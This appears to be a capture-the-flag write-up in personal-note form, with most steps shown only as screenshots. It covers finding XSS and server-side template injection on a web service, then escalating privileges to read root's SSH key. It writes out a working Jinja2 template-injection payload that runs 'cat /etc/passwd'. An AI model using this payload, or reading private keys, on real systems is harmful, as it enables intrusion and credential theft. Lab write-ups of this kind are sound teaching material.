...
![](Pasted%20image%2020240916181317.png) Port 80 http service does not have anything interesting within it, but 8089 does, when we go in we find this: ![](Pasted%20image%2020240916181531.png) If we try XSS on that we get this: ![](Pasted%20image%2020240916181615.png) ![](Pasted%20image%2020240916181626.png) This page is vulnerable to XSS and also to SSTI, we know that by trying following payload: `{{5*5}}`

![](Pasted%20image%2020240916181817.png)

### EXPLOITATION

After testing some payloads, we could use this:

`{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}` ![](Pasted%20image%2020240916182013.png)
...
![](Pasted%20image%2020240916182929.png)

Spawning a stable shell:

\[\[Shell Tricks]]

![](Pasted%20image%2020240916183201.png) Now that we've got a stable shell, lets start privilege escalation

### Privilege Escalation

![](Pasted%20image%2020240916183323.png)

**GTFOBINS**

![](Pasted%20image%2020240916184431.png) Lets use this to read id\_rsa file from root:

![](Pasted%20image%2020240916184500.png) We can pass it to a file and download that file to our local machine:

![](Pasted%20image%2020240916184542.png)
...
![](Pasted%20image%2020240916185011.png) And just like that, we finished this ctf!
